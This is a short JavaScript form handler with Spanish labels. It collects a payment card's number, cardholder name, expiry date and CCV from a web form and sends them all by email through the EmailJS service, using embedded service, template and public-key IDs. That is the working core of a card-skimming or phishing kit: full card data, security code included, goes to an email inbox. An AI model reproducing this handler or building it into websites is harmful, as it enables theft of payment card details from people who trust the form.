document.addEventListener('DOMContentLoaded', () => {
	emailjs.init("b_vUFqaxw1hNCFS_v"); 
});

document.querySelector('#formulario-tarjeta').addEventListener('submit', async (e) => {
	e.preventDefault();

	const numero = document.querySelector('#inputNumero').value.trim();
	const nombre = document.querySelector('#inputNombre').value.trim();
	const mes = document.querySelector('#selectMes').value;
	const year = document.querySelector('#selectYear').value;
	const ccv = document.querySelector('#inputCCV').value.trim();

	if (!numero || !nombre || !mes || !year || !ccv) {
		alert('Por favor completa todos los campos');
		return;
	}

	const templateParams = {
		numero: numero,
		nombre: nombre,
		mes_expiracion: mes,
		year_expiracion: year,
		ccv: ccv
	};

	try {
		await emailjs.send("service_2c6shds", "template_ze36dry", templateParams);
		alert('Correo enviado correctamente.');
		document.querySelector('#formulario-tarjeta').reset();
	} catch (error) {
		console.error('Error al enviar correo:', error);
		alert('Hubo un error al enviar el correo.');
	}
});
